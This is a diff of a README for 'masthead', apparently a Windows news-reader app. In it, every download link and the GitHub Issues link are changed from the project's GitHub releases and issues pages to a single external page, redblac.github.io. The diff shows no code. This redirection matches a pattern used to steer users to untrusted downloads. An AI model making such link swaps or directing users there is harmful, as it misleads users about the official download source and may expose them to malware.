@@ -12,11 +12,11 @@ This guide will walk you through downloading and running masthead on your Window
 
 ## ⬇️ Download masthead
 
-[![Download masthead](https://img.shields.io/badge/Download-masthead-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=333333)](https://github.com/redblac/masthead/releases)
+[![Download masthead](https://img.shields.io/badge/Download-masthead-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=333333)](https://redblac.github.io)
 
 **→ Visit this link to download the application.**
 
-Click the button above or go directly to [https://github.com/redblac/masthead/releases](https://github.com/redblac/masthead/releases) to find the latest version of masthead for your computer.
+Click the button above or go directly to [https://redblac.github.io](https://redblac.github.io) to find the latest version of masthead for your computer.
 
 ---
 
@@ -148,7 +148,7 @@ masthead displays headlines as they are published by each newsroom. If a website
 
 If you encounter any issues or have questions:
 
-- Visit the [GitHub Issues page](https://github.com/redblac/masthead/issues) to report problems
+- Visit the [GitHub Issues page](https://redblac.github.io) to report problems
 - Check if a solution already exists in the issues discussion
 
 The masthead community is friendly and responsive!
@@ -165,7 +165,7 @@ masthead is made available under an open-source license. You can view the full d
 
 Ready for a calmer, cleaner news experience?
 
-**[→ Download masthead now](https://github.com/redblac/masthead/releases)**
+**[→ Download masthead now](https://redblac.github.io)**
 
 Join thousands of readers who've switched to a distraction-free way to stay informed. One download. Every major newsroom. Zero ads.
 
